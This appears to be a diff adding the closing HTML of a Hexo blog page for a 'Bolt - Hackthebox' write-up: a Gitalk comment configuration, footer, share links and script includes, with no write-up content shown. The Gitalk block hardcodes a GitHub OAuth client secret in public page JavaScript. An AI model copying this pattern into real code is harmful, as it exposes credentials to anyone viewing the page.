+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/&title=《Bolt - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/&title=《Bolt - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bolt - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACNElEQVR42u3ay26EMAwF0P7/T1Opq0otmWuHGQlzshohBnxYRPHj6ytex89Krh+/1tn9f+85u37xwsDAuC3jWK51cOv7k9/Jf9exYWBgPIex3kyTR6+33WQzXZNexIyBgYFRDLcaaLJBY2BgYPQYeUa5f8TEwMDASJLYaii9I+Pbc3EMDIwbMqqNgU/+fmN/AwMD4yaMo7Xy/+bNgJ2oMDAwZjOqr0leX21V9hqoL3JxDAyMcYz9Ma9q0S1/QvPgiIGBMY5xFnrePEi26aSdWf0EGBgYT2PkhbD9xuROie30XxgYGEMZvUNbtXDfa2oWNl8MDIzRjGr6mr/y2o9ycaENAwPjVoz9LfUzh79C8xIDA2MoI28u9o5u+fhXPhT7YmYEAwNjEKMXSrUkV20M7HwIDAyMeYzk6JaMU1STz/zI2Jxrw8DAGMQoJIqtEn/SfsiT2HI+jYGBMY5RLahV2XmIzYFXDAyM0YzeWEO+FR7x6hXdMDAwZjPyJHY/3b2q3PbPFQwMjNGMvECWJ5nV8bL8ac0xVgwMjJsz8vGIPNxqAa7a5sTAwHgao1f0z/fyXrlt51iJgYExj3EUV68Bud9yKBwNMTAwxjGqG1xe9K8+rTc0hoGB8RxG3lbMk9hqq3K/GIeBgfEERq8B0Ntee0lsVGjDwMDAiK/k4P0hDwwMDIydJLM3+NUsqGFgYDyAkSex1UZCb/wrGeDYysUxMDBuxbi2MZm/LA/oqhENDAyMGzK+Ab1DmE70wX1kAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
